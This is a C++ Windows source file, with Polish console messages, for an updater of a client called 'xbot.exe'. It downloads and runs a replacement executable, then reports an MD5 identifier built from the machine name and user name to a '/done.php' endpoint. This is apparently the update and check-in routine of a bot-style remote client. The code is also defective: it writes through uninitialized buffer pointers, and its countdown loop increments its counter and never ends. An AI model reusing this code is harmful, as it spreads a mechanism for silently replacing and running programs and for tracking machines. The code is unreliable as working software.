#include "stdafx.h"
#include "Connection.h"
#include "MD5.h"

bool DownloadNewClientOUT()
{
	NewConnection Download;
	return Download.DownloadNewClient();
}

void DeleteOldClient()
{
	DeleteFileA("xbot.exe");
}

void RenameNewClient()
{
	rename("new.exe", "xbot.exe");
}

void ExecuteNewClient()
{
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	CreateProcessA("xbot.exe", NULL, NULL, NULL, FALSE, NULL, NULL, "C:\\XBOT_ALPHA\\", &si, &pi);
}

void SendInfoAboutCompletionOfUpdate()
{
	std::string id;
	DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
	char* buf;
	GetComputerNameA(buf,&size);
	id = buf;
	char* buf2;
	size = 256 + 1;
	GetUserNameA(buf2, &size);
	id += buf2;
	id = md5(id);
	
	NewConnection Connection;
	Connection.run_winsock();
	while (!Connection.create_socket())Sleep(30000);
	std::string http_query = "/done.php?id=" + id;
	Connection.send_data(http_query);
	Connection.close_socket();
	WSACleanup();
}

int APIENTRY _tWinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPTSTR    lpCmdLine,
	int       nCmdShow)
{
	AllocConsole();
	freopen("CONIN$", "rb", stdin);
	freopen("CONOUT$", "wb", stdout);
	freopen("CONOUT$", "wb", stderr);
	for (int i = 20; i >= 1; i++, Sleep(1000))
		printf("Aktualizacja rozpocznie sie za %d sekund!\n", i);

	printf("Rozpoczynanie procedury aktualizacji!\n");
	while (!DownloadNewClientOUT())Sleep(30000);
	DeleteOldClient();
	RenameNewClient();
	ExecuteNewClient();
	SendInfoAboutCompletionOfUpdate();
	exit(1);
}